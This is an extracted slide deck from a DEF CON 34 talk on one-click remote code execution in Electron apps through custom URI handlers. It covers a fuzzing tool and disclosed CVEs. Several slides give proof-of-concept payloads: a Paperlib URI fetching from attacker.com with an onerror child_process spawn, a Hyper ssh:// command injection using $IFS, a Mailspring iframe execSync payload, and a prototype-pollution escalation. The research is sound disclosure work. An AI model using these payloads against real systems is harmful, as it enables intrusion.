---
title: "LaunchBreak a Sip of Tea, a Click, and a Full Multi-stage Desktop Takeover"
speakers: ["Gavin Zhong", "Zhengyu Liu", "Jianjia Yu"]
conference: "DEF CON"
conference_full: "DEF CON 34"
edition: "34"
year: null
source_pdf: "DEF CON 34/DEF CON 34 - Gavin Zhong, Zhengyu Liu, Jianjia Yu - LaunchBreak a Sip of Tea, a Click, and a Full Multi-stage Desktop Takeover - launchbreak 2 0.pdf"
pages: 126
sha256: "2d9bf710a3c718084018ff4a49cac412b44fa3fbf5b893f61dbeedfeb44684e1"
text_chars: 59703
ocr_pages: 5
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T00:19:35Z"
---
# LaunchBreak a Sip of Tea, a Click, and a Full Multi-stage Desktop Takeover

**Speakers:** Gavin Zhong, Zhengyu Liu, Jianjia Yu  
**Conference:** DEF CON 34  
**Source:** `DEF CON 34/DEF CON 34 - Gavin Zhong, Zhengyu Liu, Jianjia Yu - LaunchBreak a Sip of Tea, a Click, and a Full Multi-stage Desktop Takeover - launchbreak 2 0.pdf` (126 pages)

## Slide 1

**LaunchBreak A Sip of Tea, a Click, and a Full Multi-stage Desktop Takeover**

**Jianjia Yu Zhengyu Liu Gavin Zhong Johns Hopkins University**

**Contributors: Ziyang Li, Yu Sun, Yinzhi Cao Aug. 2026** · **DEFCON 34** · **Las Vegas**

1

## Slide 2

## **WHOAMI**

**Jianjia Yu PhD, Johns Hopkins University @yujianjiasuzy**

- **DEF CON 33 speaker — The DOMino**

- **Effect**

- **Distinguished Papers @ CCS'23,**

- **S&P'25**

- **40+ 0-days across extensions &**

- **mobile**

**Zhengyu Liu PhD student, Johns Hopkins University @jackfromeast**

- **DEF CON 33 speaker — The DOMino**

- **Effect**

- **Distinguished Paper @ S&P'25**

- **Best Student Paper @ ICICS'22**

- **CTF: TheHackersCrew**

**Gavin Zhong Inc. PhD student, UC Santa Barbara @zhong**

- **MS Security Informatics, JHU**

- **Web Security & AI Security**

- **Researcher**

- **Former Privacy Engineer @ TikTok**

- **Black Hat, BsidesSF Speaker**

**Contributors: Ziyang Li · Yu Sun · Yinzhi Cao · Johns Hopkins University**

2

**LaunchBreak** ·  DEF CON 34

## Slide 3

## **ROADMAP**

**1** **Intro: AI desktop apps, custom URI, and LaunchBreak**

**2** **LaunchBreak Systematizing: sources × cross-process flows × sinks**

**3** **Proton: agentic segmented fuzzing**

**4** **Tea Time: end-to-end zero-day RCE case studies**

**5** **Mitigations & takeaways**

3

**LaunchBreak** ·  DEF CON 34

## Slide 4

**Introduction 0x01 AI desktop apps, custom URI, and LaunchBreak**

4

## Slide 5

###### **§1 · INTRO**

## **The AI boom pushes hundreds of Electron apps to ship with custom URI**

**Chrome Chrome** https://myapp.com/mcp-install https://gitlab.com **Open myapp?** https://myapp.com/ wants to open this app. **Features: Features:** - Please click on this <u>link</u> - Please click on thisCancel Open <u>link myapp://mcp-install?q=xx</u> **MCP install / plugin install / prompt-driven actions**

**Example apps: Cherry Studio, Hyper, AFFiNE, DeepChat, Dive, Pinokio, …**

**LaunchBreak** ·  DEF CON 34

5

## Slide 6

###### **§1 · INTRO**

**The AI boom pushes hundreds of Electron apps to ship with custom URI**

**Chrome Chrome One click, zero friction.** https://myapp.com/mcp-install https://gitlab.com **Open myapp?** https://myapp.com/ wants to open this app. **Features: Also: one click, full remote code execution.Features:** - Please click on this <u>link</u> - Please click on thisCancel Open <u>link</u>

<u>myapp://mcp-install?q=xx</u>

**MCP install / plugin install / prompt-driven actions**

**Example apps: Cherry Studio, Hyper, AFFiNE, DeepChat, Dive, Pinokio, …**

**LaunchBreak** ·  DEF CON 34

6

## Slide 7

**§1 · INTRO**

## **Custom URI 101**

▸ **Apps register an OS-level custom scheme:  myapp://** ▸ **Different OS has its own registration + launch path**

**macOS CFBundleURLTypes / LaunchServices Windows HKCR + shell open Linux .desktop handler A single attacker-controlled URI → privileged app logic → RCE.**

7

**LaunchBreak** ·  DEF CON 34

## Slide 8

**§1 · MOTIVATING DEMO**

## **Demo 0 — Paperlib: one-click RCE**

**Paperlib open-source reference manager (2.2k )**

8

**LaunchBreak** ·  DEF CON 34

## Slide 9

###### **§1 · MOTIVATING DEMO**

## **Demo 0 — Paperlib: what happened?**

**Chrome** https://gitlab.com/mal/repo **Features:** - Please click on this <u>link</u>

**Chrome** https://gitlab.com **Open Paperlib?** https://gitlab.com/ wants to open this app. **Features:** - Please click on this Cancel Open **1** <u>link</u> **2**

**Chrome Chrome** https://gitlab.com/malicious/r **Paperlib Paperlib** https://gitlab.com/malicious/repo epo Welcome to paperlib! Authors: xxx <script>xxx **Calculator.app** Authors:xxx **Features:** DOI: xxx **Features:** DOI: xxx1337 - Please click on this <u>link</u> - Please click on this <u>link</u> AC % ÷

**LaunchBreak** ·  DEF CON 34

9

## Slide 10

###### **§1 · MOTIVATING DEMO**

## **Demo 0 — Paperlib: The exploit chain**

**Payload I Payload II A parse B postMessage C fetch D render Main paperlib:// Utility attacker Renderer open-url URI fetch() server v-html sink handler**

10

**LaunchBreak** ·  DEF CON 34

## Slide 11

###### **§1 · MOTIVATING DEMO**

### **Demo 0 — Paperlib: main process: URI parsing and message passing**

**main.ts** (Main Process)

**Payload I**

paperlib://PLAPI.commandServ ice.run?args=["import-from", "https://evil.com/poc.html"]

**Custom URI parsing and A handling**

- 1 app.on( " open-url " , (event, uri) => { 2 const { protocol, hostname, search } = new URL(uri); 3 const [api, service, method] = hostname.split("."); 4 const params = new URLSearchParams(search); 5 const args = JSON.parse(params.get("args") || "[]"); 6 global[api][service][method](args); });api][service][method](args); });][service][method](args); });service][method](args); });][method](args); });method](args); });](args); });args); });); });

- 6 global[api][service][method](args); });api][service][method](args); });][service][method](args); });service][method](args); });][method](args); });method](args); });](args); });args); });); }); **B Cross-process messaging**

- 7 8 global.PLAPI.commandService.run = function(args){ 9 utilityPort.postMessage(args); };

**LaunchBreak** ·  DEF CON 34

11

## Slide 12

###### **§1 · MOTIVATING DEMO**

### **Demo 0 — Paperlib: utility process: CSRF**

###### **util.ts** (Utility Process)

- 1 port.onmessage = msg => {

- 2 const [methodName, ...methodArgs] = msg.data;

- 3 const fn = utilityMethods[methodName]; 4 fn(...methodArgs); };

- 5 const utilityMethods = {

- 6 "import-from": async (webUrl) => {

**C**

**Fetch (Client-side Request Forgery) Introduces second payload**

- 7 const text = await (await fetch(webUrl)) .text();

- 8 rendererPort.postMessage({ content: text }); 9 }, ... };

**LaunchBreak** ·  DEF CON 34

<img src=1 onerror="require('child_proc **Payload II** ess').spawn('open',['-a','Ca lculator'])">

12

## Slide 13

###### **§1 · MOTIVATING DEMO**

### **Demo 0 — Paperlib: renderer process: DOM XSS**

**paper-detail-view.vue** (Renderer Process)

- 1 port.onmessage = msg => { 2 slot1.push({ content: msg.data.content }); }; 3 <Section /* Vue Template */ 4 v-for="(item, index) in slot1" 5 :id="`detailspanel-slot1-${index}`" 6 :title="item.title"> 7 <div v-html="item.content"> </div> 8 </Section>

**D DOM XSS -> Arbitrary command execution**

**LaunchBreak** ·  DEF CON 34

13

## Slide 14

###### **§1 · MOTIVATING DEMO**

### **Demo 0 — Paperlib: the ultimate secret**

**Payload I: paperlib URI**

paperlib://PLAPI.commandService.run?args=%5B%22import-from%22%2 C%22https%3A%2F%2Fattacker.com%2Fmostly-harmless%2Fpaperlib_po c%2Fpay2.pdf%22%5D

**Payload II: PDF containing the following payload, hosted on attacker.com**

<img src="1" onerror="require('child_process').spawn('open', ['-a', 'Calculator'])">

**LaunchBreak** ·  DEF CON 34

14

## Slide 15

**0x02**

**Systematizing LaunchBreak The complex chain behind the scene**

15

## Slide 16

###### **§2 · BACKGROUND**

## **Electron architecture**

…
Electron Framework
Bundled: Chromium + Node.js  + libuv Renderer: sandboxed web content
Renderer ProcessesRendererRenderer
Chromium pages, DOM
Chromium pages, DOM Chromium pages, DOM Preload: the guarded bridge between
Node
Preload them.
Integration
Exposed APIs Enabled
Spawns Delegates Configures
UtilityUtilityUtility Main Process main/utility: full Node.js
Process
ProcessesProcess App lifecycle, Native APIs
Native Modules
Node native addons, OS integrations, Electron APIs

**LaunchBreak** ·  DEF CON 34

16

## Slide 17

###### **§2 · BACKGROUND**

Electron architecture
…
Electron Framework
Bundled: Chromium + Node.js  + libuv
Renderer ProcessesRendererRenderer
Chromium pages, DOM
Chromium pages, DOM Chromium pages, DOM
Electron apps use
Node
Preload
Integration
Exposed APIs Enabled IPC (inter-process communication)
Spawns Delegates Configures channels for messaging between
ProcessUtilityUtilityUtility Main Process processes
ProcessesProcess App lifecycle, Native APIs
Native Modules
Node native addons, OS integrations, Electron APIs

**LaunchBreak** ·  DEF CON 34

17

## Slide 18

###### **§2 · BACKGROUND**

## **Electron architecture**

…
Electron Framework
Bundled: Chromium + Node.js  + libuv
Renderer ProcessesRendererRenderer
Chromium pages, DOM
Chromium pages, DOM Chromium pages, DOM
Node
Preload
Integration
Exposed APIs Enabled
Spawns Delegates Configures
UtilityUtilityUtility Main Process
Process
ProcessesProcess App lifecycle, Native APIs
Native Modules
Node native addons, OS integrations, Electron APIs

**Electron apps use LaunchBreak abuses these IPC IPC (inter-process communication)channels to carry taint across channels for messaging between processes, from a webpage all the way to spawn().processes**

**LaunchBreak** ·  DEF CON 34

18

## Slide 19

###### **§2 · BACKGROUND**

## **A lineage of Electron security research — and a shared blind spot**

**Electronegativity Black Hat 2017 static config auditing**

**2017**

**Preloading Insecurity Black Hat 2019 preload / IPC abuse 2019**

**ElectroVolt LaunchBreak BH 2022 / DC 30 DEF CON 34 XSS** → **RCE escalation browser click** → **RCE 2022 2026**

**All assume the attacker is ALREADY INSIDE, e.g., XSS in the renderer, escalate to RCE**

**THE SHIFT attacker is OUTSIDE — one browser click, multi-process, multi-payload chain, to RCE**

**LaunchBreak** ·  DEF CON 34

19

## Slide 20

###### **§2 · THE SHIFT**

## **LaunchBreak starts from outside the app**

**PRIOR WORK — post-compromise**

**LaunchBreak — pre-compromise**

- **Assumes XSS already in the renderer**

- **Needs a foothold to begin**

- **Starts from a browser click**

- **Chains across main / utility / renderer**

- **No foothold, no prior access required**

**ElectroVolt (BH'22) even hinted: “open-URL redirect can be turned into RCE someday.” Someday is today.**

**LaunchBreak** ·  DEF CON 34

20

## Slide 21

###### **§2 · SYSTEMATIZATION**

## **Systemization: LaunchBreak in three dimensions**

- **Sources**

- **1**

- **Sinks**

- **2**

- **3 Cross-process flows**

**how malicious content enters**

**where the payload detonates**

**how taint travels**

- **Inline-URL**

- **On-the-Fly Fetch**

- **Drop-and-Load**

- **9 sink types**

- **intermediate vs terminal**

- **main / utility / renderer**

- **cross main / utility /**

- **renderer / local server**

- **IPC / localhost requests**

**LaunchBreak** ·  DEF CON 34

21

## Slide 22

###### **§2 · SYSTEMATIZATION**

## **Systemization: LaunchBreak in three dimensions**

**Sources 1**

**Sinks 2**

**3 Cross-process flows**

**how malicious content entersA multi-stage exploit pattern where the payload detonates how taint travels**

▸ **Inline-URL**

▸ **On-the-Fly Fetch**

▸ **Drop-and-Load**

**sources × flows × sinks** ▸ **9 sink types**

▸ **9 sink types**

- **intermediate vs terminal**

- **main / utility / renderer**

▸ **cross main / utility / renderer / local server**

▸ **IPC / localhost requests**

**LaunchBreak** ·  DEF CON 34

22

## Slide 23

**§2 · DIMENSION 1**

## **Sources — how payload gets in**

**Inline-URL** Payload embedded directly in **12 / 18 zero-days** the URI The paperlib case! **On-the-Fly Fetch** URI triggers a fetch from an **4 / 18 zero-days** attacker server **Drop-and-Load** URI makes the app load a local **2 / 18 zero-days** file through path traversal

myapp://run?cmd=<payload>

app://install?url=evil.com

app://open?path=20%20%Downloads/x.js

**LaunchBreak** ·  DEF CON 34

23

## Slide 24

###### **§2 · DIMENSION 2**

## **Sinks — what it reaches**

**intermediate vs terminal terminal sink = direct consequence (OS command). intermediate sink = forwards taint to the NEXT process. This is what makes chains possible. One API can be either, depending on process & config. E.g.,** executeJavaScript **is terminal when NodeIntegration is true, but intermediate if not.**

24

**LaunchBreak** ·  DEF CON 34

## Slide 25

###### **§2 · DIMENSION 2**

## **Sinks — what it reaches**

|**Sink**|**Where**|**Pattern**|**Effect**|
|---|---|---|---|
|**Command Execution**|**main/util**|exec(T), spawn(T,{shell})|**terminal**|
|**Code Execution**|**main/util**|eval(T), new Function(T)|**term/mid**|
|**Module Loading**|**main/util**|require(T), import(T)|**terminal**|
|**File System Write**|**main/util**|fs.writeFile(T1,T2)|**terminal**|
|**External Open**|**main**|shell.openExternal/openPath(T)|**terminal**|
|**Window Script Exec**|**main**|webContents.executeJavaScript(T)|**mid/term**|
|**DOM Script Exec**|**renderer**|element.innerHTML = T|**mid/term**|
|**Window Navigation**|**renderer**|win.loadURL / location.href = T|**mid/term**|
|**Subview Injection**|**renderer**|iframe.src / webview.src = T|**mid/term**|

**LaunchBreak** ·  DEF CON 34

25

## Slide 26

**§2 · DIMENSION 3**

## **Cross-process exploit flows**

###### **Same entry point, wildly different cross-process routes. A few real cases:**

Main / PTY
URI main renderer
spawn
Hyper
main local server
URI
navigation require() .js file
Pinokio
utility renderer
URI main
fetch v-html
Paperlib
Uniform trigger · diverse, multi-stage, app-specific chains  →  that's why one detector must generalize.
LaunchBreak   ·  DEF CON 34

26

## Slide 27

###### **§2 · WHY IT WAS MISSED**

## **Why largely ignored: core challenges**

- **Static analysis**

- **Dynamic analysis**

- **(e.g., fuzzing)**

###### **Manual analysis**

- **cross-process data & control**

- **flow is hard to model**

- **dynamic dispatch:**

- global[a][b][c](args)

- **production code is minified /**

- **obfuscated**

- **cross-process chains** → **state**

- **explosion**

- **must satisfy strict URI/JSON**

- **parsing first**

- **multiplicative cost per extra**

- **process**

- **multi-source, multi-process**

- **chains to line up**

- **sanitization checks to bypass**

- **per-app logic — doesn't scale to**

- **589 apps**

###### **Only one public blog (2020) ever touched this. No paper, no tooling.**

27

**LaunchBreak** ·  DEF CON 34

## Slide 28

**0x03**

**Proton Practical detection via agentic segmented fuzzing**

28

## Slide 29

**§3 · THE IDEA**

## **Why end-to-end fuzzing explodes**

- **Model a fuzzing campaign's cost by its program state space:**

**– I = instructions on the path,  N = input space**

- **One monolithic campaign to validate a path:**

**single-path cost O( N · I )**

- **two segments, end-to-end:**

- **O( (Na + Nb) · Ia · Ib )** ← **multiplicative**

29

**LaunchBreak** ·  DEF CON 34

## Slide 30

###### **§3 · THE IDEA**

## **Segment to conquer**

**Break the chain at natural boundaries** → **fuzz each segment alone** → **recompose. Multiplicative becomes additive.**

**Dataflow-independent different payload sources**

**Partially dependent IPC between processes**

**Fully dependent invertible URL / JSON parsing**

**O(Na · Ia + Nb· Ib)**

**O(Na · Ia + Nb · Ib)**

**O(Nb · I'a)**

**Invertible parsing (new URL, JSON.parse) is the killer trick: don't brute-force valid inputs, reconstruct them backwards.**

30

**LaunchBreak** ·  DEF CON 34

## Slide 31

###### **§3 · DESIGN**

## **How Proton works**

**Phase I — Agentic static analysis**

- **LLM-guided taint analysis over the repo**

   - **finds source** → **sink paths**

   - **picks segmentation boundaries – emits per-segment fuzzing harnesses**

   - **+ initial seeds & input reconstructors**

- **Runs on Claude — agent + file/grep tools**

- **Phase II — Segmented fuzzing**

- **Fuzz each segment independently**

   - **canaries detect taint reaching a sink – oracles = parse errors / injected markers**

   - **reconstruct segment inputs backward**

- **compose** → **validate the full chain**

- **end-to-end**

31

**LaunchBreak** ·  DEF CON 34

## Slide 32

**§3 · RESULTS**

## **Proton in the wild**

**$$**

**589 18 11 11 $$ Electron apps zero-days CVEs fixes Vercel bug audited (17 RCE · 1 AFW) assigned deployed bounty (Hyper)**

▸ **88 / 489 apps flagged in Phase I · median static analysis ≈ 57s, ≈13k tokens.**

▸ **Median time-to-exposure 28 min; 82% of bugs found within 30 min of fuzzing.**

- **13 acknowledgments from maintainers · all findings past their 45-day grace period.**

▸ **Affected: AI assistants, email clients, music players, EPUB readers, dev tools.**

32

**LaunchBreak** ·  DEF CON 34

## Slide 33

**§3 · RESULTS**

## **The wall of exploits**

|**Application**|**Stars**|**Impact**|**Status**|**CVE / Advisory**|
|---|---|---|---|---|
|**AFFiNE**|**59.7k**|**RCE**|**Fixed**|**CVE-2026-21853**|
|**Motrix**|**49.8k**|**AFW**|**Reported**|**—**|
|**Hyper**|**44.5k**|**RCE**|**Ack · bounty**|**—**|
|**Cherry Studio**|**35.4k**|**RCE**|**Fixed**|**CVE-2025-54063**|
|**Mailspring**|**16.8k**|**RCE**|**Reported**|**—**|
|**DevHub**|**10k**|**RCE**|**Reported**|**—**|
|**MusicFreeDesktop**|**7k**|**RCE**|**Ack**|**CVE-2025-64514**|
|**Pinokio**|**5.7k**|**RCE**|**Fixed**|**CVE-2025-44109**|
|**DeepChat**|**4.9k**|**RCE**|**Fixed**|**CVE-2025-55733**|
|**LBRY Desktop**|**3.5k**|**RCE**|**Reported**|**CVE-2025-50477**|
|**Eidos**|**3k**|**RCE**|**Fixed**|**CVE-2025-54374**|
|**Thorium Reader**|**2.4k**|**RCE**|**Fixed**|**GHSA-3953-2fc4**|
|**Paperlib**|**2k**|**RCE**|**Fixed**|**CVE-2025-64743**|
|**TidGi-Desktop**|**1.9k**|**RCE**|**Fixed**|**GHSA-fxjh-xr2f**|
|**Muffon**|**1.9k**|**RCE**|**Fixed**|**CVE-2025-55204**|
|**Dive**|**1.6k**|**RCE**|**Fixed**|**CVE-2025-58176**|
|**Vieb**|**1.5k**|**RCE**|**Fixed**|**GHSA-h2fq-667q**|
|**nanovault**|**186**|**RCE**|**Reported**|**CVE-2025-8535**|

**Dive — CVE-2025-58176**

33

**LaunchBreak** ·  DEF CON 34

## Slide 34

**0x04**

**Tea Time Zero-day one-click RCEs**

34

## Slide 35

# **DEMO 1: MAIN** → **RENDERER** → **MAIN**

35

## Slide 36

**§4 · DEMO 1: MAIN → RENDERER → MAIN**

## **Hyper — ssh:// to your shell**

**parse IPC**

**IPC exec**

**Main Renderer Main / PTY ssh:// URI parseUrl build cmd spawn**

**LaunchBreak** ·  DEF CON 34

36

## Slide 37

**§4 · DEMO 1: MAIN → RENDERER → MAIN**

## **Hyper — ssh:// to your shell**

**IPC**

**parse**

**Main Renderer ssh:// URI parseUrl build cmd**

IPC exec

**Main / PTY spawn**

- **Vercel's terminal emulator (44.5k** ★ **).**

- **URI parsed in main** → **command built in renderer** → **sent back to the PTY (main) to execute.**

- **Vercel acknowledged it with a bug bounty.**

**LaunchBreak** ·  DEF CON 34

37

## Slide 38

###### **§4 · DEMO 1: MAIN → RENDERER → MAIN**

## **Hyper — ssh:// to your shell**

**parse**

**Main parseUrl**

**ssh:// URI**

app.on('open-url', (_event, sshUrl) => { GetWindow((win: BrowserWindow) => { win.rpc.emit('open ssh', parseUrl(sshUrl)); }); });

**IPC**

**IPC exec**

**Renderer build cmd**

**Main / PTY spawn**

let command = `${parsedUrl.protocol} ${parsedUrl.user ? `${parsedUrl.user}@` : ''}${parsedUrl.resource}`; if (parsedUrl.port) command += ` -p ${parsedUrl.port}`; command += '\n';

rpc.on('open ssh', (parsedUrl) => { store_.dispatch(uiActions .openSSH(parsedUrl)); });

**LaunchBreak** ·  DEF CON 34

38

## Slide 39

**§4 · DEMO 1: MAIN → RENDERER → MAIN**

**Hyper — ssh:// to your shell**

ssh://;id/x ssh ;id

39

## Slide 40

40

## Slide 41

**§4 · DEMO 1: MAIN → RENDERER → MAIN**

**Hyper — ssh:// to your shell**

But, how to execute command with multiple args?

$IFS

**“**

**In Bash, the** $IFS **(Internal Field Separator) variable can be used to simulate spaces between arguments. ”**

41

## Slide 42

**§4 · DEMO 1: MAIN → RENDERER → MAIN**

**Hyper — ssh:// to your shell**

###### **open -a Calculator.app**

ssh

ssh://@;a=open;b=-a;c=Calculator.app; $a $IFS$ b $IFS$ c

- ;a=open;b=-a;c=Calculator.app; $a$IFS$b$IFS$c

**LaunchBreak** ·  DEF CON 34

42

## Slide 43

43

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
@@@ = & Newincognito Tab x +
«>c¢aG &AlMode) CR | & incognito
© Scientific practice 3¢ Claude @ ChatGPT Hopkins AlLab (9 miniapp [9 misc @ electronegativity_..
You've gone Incognito
Others who use this device won't see your activity, so you can browse more privately. This
won't change how data is collected by websites you visit and the services they use, including
Google. Downloads, bookmarks and reading list items will be saved. Learn more
Chrome won't save: Your activity might still be visible to:
* Your browsing history * Websites you visit
* Cookies and site data * Your employer or school
* Information entered in forms * Your internet service provider
® Third-party cookies are blocked
When you're in Incognito mode, sites can't use third-party cookies. If a site that
relies on these cookies isn't working, you can try giving that site temporary access
to third-party cookies.
iTerm
»
Relaunch to update ?
© All Bookmarks
43
```

## Slide 44

# **DEMO 2: MAIN** → **RENDERER (XSS)** → **RCE**

**Extra Payload: auto-downloaded file**

44

## Slide 45

- **§4 · DEMO 2: MAIN → RENDERER (XSS) → RCE**

## **Mailspring — mailto: and a CSP collapse**

**mailto: URI**

**parse**

**XSS**

**Main Renderer parse body innerHTML XSS**

**file:// iframe** require()

- **Open-source email client (16.8k** ★ **).**

- **Loads email body from the mailto: URI.**

- nodeIntegration **ON,** contextIsolation **OFF.**

**LaunchBreak** ·  DEF CON 34

45

## Slide 46

- **§4 · DEMO 2: MAIN → RENDERER (XSS) → RCE**

## **Mailspring — mailto: and a CSP collapse**

**mailto: URI**

**parse**

**XSS**

**Main Renderer parse body innerHTML XSS**

**file:// iframe** require()

- **Open-source email client (16.8k** ★ **).**

- **Loads email body from the mailto: URI.**

- nodeIntegration **ON,** contextIsolation **OFF.**

If XSS, then RCE.

How?

**LaunchBreak** ·  DEF CON 34

46

## Slide 47

**1/ XSS in the Mail Body**

47

## Slide 48

##### **XSS**

https://github.com/Foundry376/Mailspring/blob/849c31271323f6b7b9758b97916017b6b585c294/app/src/component s/composer-editor/uneditable-plugins.tsx#L7C1-L39C2 export const UNEDITABLE_TYPE = 'uneditable'; export const UNEDITABLE_TAGS = ['table', 'img', 'center', 'signature']; function UneditableNode(props) { const { attributes, node, editor, targetIsHTML, isFocused, children } = props; const __html = node.data.get ? node.data.get('html') : node.data.html; if (targetIsHTML) { return <div dangerouslySetInnerHTML= {{ __html }} />; } // … }

**When mail body has the** UNEDITABLE_TAGS **tags, it will not be sanitized and inject to** dangerouslySetInnerHTML

XSS!

**LaunchBreak** ·  DEF CON 34

This is not enough, though.

48

## Slide 49

##### **CSP defense**

**The above window’s URL:**

file: ///Applications/Mailspring.app/Contents/Resources/app.asar/static/index.html?loadSettings=...

**With CSP being:**

https://github.com/Foundry376/Mailspring/blob/849c31271323f6b7b9758b97916017b6b585c294/app/static/index .html#L6

script-src 'self' chrome-extension://react-developer-tools;

49

## Slide 50

# **2/ Bypass CSP through file:// Protocol**

50

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
yy
&
*
7%
x
2/ Bypass CSP through file:// Protocol
```

## Slide 51

##### **Bypass CSP through file:// Protocol**

**An attacker can supply the following payload to cause the script inside iframe.html to execute.**

<table id=x><tr><td><iframe src= "file:///Users/username/iframe.html" ></iframe></td></tr></table>

**With** **file:///Users/username/iframe.html being:**

<html>

- <script>

window.parent.require('child_process').execSync('open -a /System/Applications/Calculator.app'); </script>

</html>

How does an attacker control **file:///Users/username/iframe.html** ?

51

## Slide 52

# **3/ Auto-download the file**

HTTP/1.1 200 OK Content-Type: text/html Content-Disposition: attachment; filename="iframe.html" Cache-Control: no-store

52

## Slide 53

**§2 · DIMENSION 1**

## **Sources — how payload gets in**

**Inline-URL** Payload embedded directly in myapp://run?cmd=<payload> **12 / 18 zero-days** the URI **On-the-Fly Fetch** URI triggers a fetch from an app://install?url=evil.com **4 / 18 zero-days** attacker server Quick recall… **Drop-and-Load** URI makes the app load a local app://open?path=20%20%Downloads/x.js **2 / 18 zero-days** file through path traversal

**LaunchBreak** ·  DEF CON 34

53

## Slide 54

**§4 · DEMO 2: MAIN → RENDERER (XSS) → RCE**

## **Mailspring — mailto: and a CSP collapse**

**parse XSS**

**Main Renderer parse body innerHTML XSS**

**mailto: URI**

**file:// iframe** require()

**Payload I: URI**

**Payload II: auto-downloaded file**

54

## Slide 55

##### **Final POC**

55

## Slide 56

###### **DEMO 3: MAIN** → **RENDERER** → **WEBVIEW/IFRAME (XSS** → **PP)** → **RCE**

56

## Slide 57

**§4 · DEMO 3: MAIN → RENDERER → WEBVIEW/IFRAME (XSS→PP) → RCE**

## **Thorium Reader — double prototype pollution**

**Escape parse route render by PP Renderer Main Webview/iframe RCE thorium:// URI opens EPUB open-url sandboxed XSS process.binding into webview**

- **EPub reader by the European Digital Reading Lab (2.8k** ★ **).**

- **PP1 leaks** ipcRenderer **; a listener flood + PP2 captures** process **.**

- ▸ **Require-less RCE:** process.binding('spawn_sync').

two chained prototype pollutions

**LaunchBreak** ·  DEF CON 34

57

## Slide 58

#### **1/ XSS via Malicious ePub Import**

58

## Slide 59

#### **XSS via Malicious EPub Import**

**Thorium Reader’s** thorium: **handler lets the app download and open an ePub from a remote URL. E.g.:**

thorium://your_server_address/evil.epub

**LaunchBreak** ·  DEF CON 34

59

## Slide 60

#### **XSS via Malicious EPub Import**

**Thorium Reader’s** thorium: **handler lets the app download and open an ePub from a remote URL. E.g.:**

thorium://your_server_address/evil.epub

**The ePub can contain HTML code with embedded malicious js script.**

XSS in the reader webview

**LaunchBreak** ·  DEF CON 34

60

## Slide 61

#### **XSS via Malicious EPub Import**

**However, the malicious ePub is opened in the webview with following preferences:**

<webview webpreferences="enableRemoteModule=0, allowRunningInsecureContent=0, backgroundThrottling=0, nodeIntegration=0, contextIsolation=0, nodeIntegrationInWorker=0, sandbox=0, webSecurity=1, webviewTag=0, partition=persist:readium2pubwebview">

No direct Node.js

61

## Slide 62

#### **XSS via Malicious EPub Import**

**However, the malicious ePub is opened in the webview with following preferences:**

<webview webpreferences="enableRemoteModule=0, allowRunningInsecureContent=0, backgroundThrottling=0, nodeIntegration=0, contextIsolation=0, nodeIntegrationInWorker=0, sandbox=0, webSecurity=1, webviewTag=0, partition=persist:readium2pubwebview">

No direct Node.js But, can we exploit the context isolation?

62

## Slide 63

#### **2/ Escalating XSS to RCE through Prototype Pollution**

63

## Slide 64

#### **Escalating XSS to RCE through Prototype Pollution**

##### **What does** **contextIsolation=0 mean?**

**Website Code Preload Scripts** e.g., https://google.com

**Electron Renderer Process**

64

## Slide 65

#### **Escalating XSS to RCE through Prototype Pollution**

**What does** **contextIsolation=0 mean?** May load arbitrary websites, Untrusted!

**Website Code Preload Scripts** e.g., https://google.com

**Electron Renderer Process**

65

## Slide 66

#### **Escalating XSS to RCE through Prototype Pollution**

**What does** **contextIsolation=0 mean?** May load arbitrary websites, Untrusted!

Functions def i ned by electron app developers. More privileged (Node Modules, Electron Modules, etc.)!

**Website Code Preload Scripts** e.g., https://google.com

**Electron Renderer Process**

66

## Slide 67

#### **Escalating XSS to RCE through Prototype Pollution**

**What does** **contextIsolation=0 mean?** May load arbitrary websites, Untrusted!

Functions def i ned by electron app developers. More privileged (Node Modules, Electron Modules, etc.)!

**Website Code Preload Scripts** e.g., https://google.com

Ideally, Website c ode should only a **Electron Renderer Process** ccess the exposed functions from Preload Scripts but not others. But how?

67

## Slide 68

#### **Escalating XSS to RCE through Prototype Pollution**

**What does** **contextIsolation=0 mean?**

Use Closure!

Website Code
Preload Scripts
e.g., https://google.com

**Electron Renderer Process**

68

## Slide 69

#### **Escalating XSS to RCE through Prototype Pollution**

##### **What does** **contextIsolation=0 mean?**

Closur e

Sensitive modules

_// preload.js_ ((require, process, ...) => { const { clipboard } = require("electron"); _// Expose only a limited function._ window.desktopAPI = { readClipboard: () => clipboard.readText() }; })(require, process, ...); _// website.js_ const text = window.desktopAPI.readClipboard(); _// Allowed_ console.log(typeof require); // undefined

Your preload scripts

69

## Slide 70

#### **Escalating XSS to RCE through Prototype Pollution**

##### **What does** **contextIsolation=0 mean?**

_// preload.js_ ((require, process, ...) => { const { clipboard } = require("electron"); _// Expose only a limited function._ window.desktopAPI = { readClipboard: () => clipboard.readText() }; })(require, process, ...); _// website.js_ const text = window.desktopAPI.readClipboard(); _// Allowed_ console.log(typeof require); // undefined

Expose functions to main world

70

## Slide 71

#### **Escalating XSS to RCE through Prototype Pollution**

##### **What does** **contextIsolation=0 mean?**

Can only access the exposed functions!

_// preload.js_ ((require, process, ...) => { const { clipboard } = require("electron"); _// Expose only a limited function._ window.desktopAPI = { readClipboard: () => clipboard.readText() }; })(require, process, ...);

Expose functions to main world

_// website.js_ const text = window.desktopAPI.readClipboard(); _// Allowed_ console.log(typeof require); // undefined

71

## Slide 72

#### **Escalating XSS to RCE through Prototype Pollution**

##### **What does** **contextIsolation=0 mean?**

Share the same global context!

_// preload.js_ ((require, process, ...) => { const { clipboard } = require("electron");

_// Expose only a limited function._ window.desktopAPI = { readClipboard: () => clipboard.readText() };

})(require, process, ...);

_// website.js_ const text = window.desktopAPI.readClipboard(); _// Allowed_ console.log(typeof require); // undefined

72

## Slide 73

#### **Escalating XSS to RCE through Prototype Pollution**

**What does** **contextIsolation=0 mean?**

Share the same global context!

_// preload.js_ ((require, process, ...) => { const { clipboard } = require("electron"); _// Expose only a limited function._ window.desktopAPI = { readClipboard: () => clipboard.readText() }; "a".concat("b"); _// pwned_ Prototype pollution! })(require, process, ...); _// website.js_ const text = window.desktopAPI.readClipboard(); _// Allowed_ console.log(typeof require); // undefined String.prototype.concat = () => "pwned";

73

## Slide 74

#### **Escalating XSS to RCE through Prototype Pollution**

Hook

Function.prototype.apply

#### Invoke

